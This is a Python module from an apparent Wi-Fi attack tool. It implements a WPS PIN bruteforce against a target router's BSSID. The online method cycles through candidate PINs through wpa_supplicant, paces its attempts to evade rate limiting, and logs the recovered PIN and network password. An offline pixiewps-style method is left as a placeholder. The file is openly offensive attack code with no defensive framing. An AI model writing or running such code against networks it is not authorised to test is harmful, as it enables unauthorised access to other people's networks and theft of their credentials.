"""PIN bruteforce attack implementation"""
import logging
import time
from typing import Optional, Callable, List
from dataclasses import dataclass
from ..pins.generator import PinCandidate
from ..core.wpa_controller import WPASupplicantController

logger = logging.getLogger("farhan_shot.attacks.bruteforce")


@dataclass
class BruteforceResult:
    """Result from bruteforce attack"""
    success: bool
    pin: Optional[str] = None
    password: Optional[str] = None
    pins_tried: int = 0
    duration: float = 0.0
    error: Optional[str] = None


class PINBruteforce:
    """WPS PIN bruteforce attack"""
    
    def __init__(
        self,
        wpa_controller: WPASupplicantController,
        delay: float = 1.5,
        max_attempts: int = 50
    ):
        """Initialize bruteforce attack
        
        Args:
            wpa_controller: WPA supplicant controller instance
            delay: Delay between PIN attempts (seconds)
            max_attempts: Maximum number of PIN attempts
        """
        self.wpa = wpa_controller
        self.delay = delay
        self.max_attempts = max_attempts
    
    def attack_online(
        self,
        bssid: str,
        pins: List[PinCandidate],
        progress_callback: Optional[Callable[[int, int, str], None]] = None
    ) -> BruteforceResult:
        """Perform online PIN bruteforce attack
        
        Args:
            bssid: Target BSSID
            pins: List of PIN candidates to try
            progress_callback: Optional callback(current, total, pin)
            
        Returns:
            BruteforceResult with attack outcome
        """
        logger.info(f"Starting online bruteforce on {bssid} with {len(pins)} PINs")
        
        start_time = time.time()
        pins_tried = 0
        
        # Ensure wpa_supplicant is running
        if not self.wpa.is_running():
            if not self.wpa.start():
                return BruteforceResult(
                    success=False,
                    error="Failed to start wpa_supplicant"
                )
        
        # Try each PIN
        for i, pin_candidate in enumerate(pins[:self.max_attempts], 1):
            if progress_callback:
                progress_callback(i, min(len(pins), self.max_attempts), pin_candidate.pin)
            
            logger.debug(f"Trying PIN {i}/{min(len(pins), self.max_attempts)}: {pin_candidate.pin} ({pin_candidate.algorithm})")
            
            # Attempt PIN attack
            password = self.wpa.wps_pin_attack(bssid, pin_candidate.pin, timeout=20)
            pins_tried += 1
            
            if password:
                duration = time.time() - start_time
                logger.info(f"Success! PIN: {pin_candidate.pin}, Password: {password}")
                
                return BruteforceResult(
                    success=True,
                    pin=pin_candidate.pin,
                    password=password,
                    pins_tried=pins_tried,
                    duration=duration
                )
            
            # Delay between attempts to avoid rate limiting
            if i < len(pins):
                time.sleep(self.delay)
        
        duration = time.time() - start_time
        logger.warning(f"Bruteforce failed. Tried {pins_tried} PINs in {duration:.1f}s")
        
        return BruteforceResult(
            success=False,
            pins_tried=pins_tried,
            duration=duration,
            error="No valid PIN found"
        )
    
    def attack_offline(
        self,
        pins: List[PinCandidate],
        handshake_data: Optional[dict] = None
    ) -> BruteforceResult:
        """Perform offline PIN bruteforce (requires captured handshake)
        
        Args:
            pins: List of PIN candidates
            handshake_data: Captured WPS handshake data
            
        Returns:
            BruteforceResult with attack outcome
        """
        logger.info("Offline bruteforce attack")
        
        # Placeholder: Real implementation would use captured M1-M7 messages
        # and attempt to crack PIN offline using pixiewps or similar
        
        return BruteforceResult(
            success=False,
            error="Offline bruteforce requires captured WPS handshake data"
        )
